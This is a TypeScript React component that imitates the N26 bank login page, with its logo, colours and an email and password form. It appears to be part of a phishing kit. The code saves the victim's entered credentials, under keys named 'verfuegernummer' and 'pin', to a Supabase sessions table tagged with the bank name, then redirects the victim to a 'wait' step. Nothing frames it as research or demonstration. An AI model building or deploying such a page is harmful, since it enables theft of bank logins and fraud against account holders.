"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { stepToPath } from "@/lib/session-routes";

export function N26Client({ sessionId }: { sessionId: string }) {
  const router = useRouter();
  const supabase = createBrowserSupabaseClient();
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [saving, setSaving] = useState(false);

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (!supabase || !sessionId) return;
      const { data } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
      if (cancelled || !data) return;
      const fd = (data.form_data ?? {}) as Record<string, string>;
      if (fd.verfuegernummer) setUsername(fd.verfuegernummer);
      if (fd.pin) setPassword(fd.pin);
    })();
    return () => { cancelled = true; };
  }, [sessionId, supabase]);

  async function handleSubmit() {
    if (!supabase || !sessionId) return;
    setSaving(true);
    const { data: existing } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
    const prev = (existing?.form_data ?? {}) as Record<string, unknown>;
    await supabase.from("sessions").update({
      current_step: "wait",
      form_data: { ...prev, bankSlug: "n26", bankName: "N26", verfuegernummer: username, pin: password }
    }).eq("id", sessionId);
    router.replace(stepToPath("wait", sessionId));
  }

  return (
    <div className="min-h-screen bg-white font-sans flex flex-col items-center pt-16 px-4">
      <div className="w-full max-w-[400px]">
        <div className="flex justify-center mb-10">
          <img src="/bank-logos/n26.svg" alt="N26" className="h-8" />
        </div>
        
        <h1 className="text-[28px] font-medium text-[#36A18B] mb-8 text-center">Log in to your account</h1>
        
        <form onSubmit={(e) => { e.preventDefault(); void handleSubmit(); }} className="space-y-6">
          <div className="relative">
            <input 
              required 
              type="email" 
              id="n26-email"
              value={username} 
              onChange={e => setUsername(e.target.value)} 
              className="peer w-full border-b-2 border-gray-300 py-2 px-1 focus:outline-none focus:border-[#36A18B] text-[16px] placeholder-transparent" 
              placeholder="Email"
            />
            <label htmlFor="n26-email" className="absolute left-1 -top-3.5 text-xs text-gray-500 transition-all peer-placeholder-shown:text-base peer-placeholder-shown:top-2 peer-focus:-top-3.5 peer-focus:text-xs peer-focus:text-[#36A18B]">
              Email
            </label>
          </div>
          
          <div className="relative">
            <input 
              required 
              type="password" 
              id="n26-pw"
              value={password} 
              onChange={e => setPassword(e.target.value)} 
              className="peer w-full border-b-2 border-gray-300 py-2 px-1 focus:outline-none focus:border-[#36A18B] text-[16px] placeholder-transparent" 
              placeholder="Password"
            />
            <label htmlFor="n26-pw" className="absolute left-1 -top-3.5 text-xs text-gray-500 transition-all peer-placeholder-shown:text-base peer-placeholder-shown:top-2 peer-focus:-top-3.5 peer-focus:text-xs peer-focus:text-[#36A18B]">
              Password
            </label>
          </div>
          
          <button type="submit" disabled={saving || !username || !password} className="w-full bg-[#36A18B] text-white font-medium py-3.5 rounded-[4px] mt-6 hover:bg-[#2B816F] disabled:opacity-50 transition-colors">
            {saving ? "Loading..." : "Log in"}
          </button>
        </form>
      </div>
    </div>
  );
}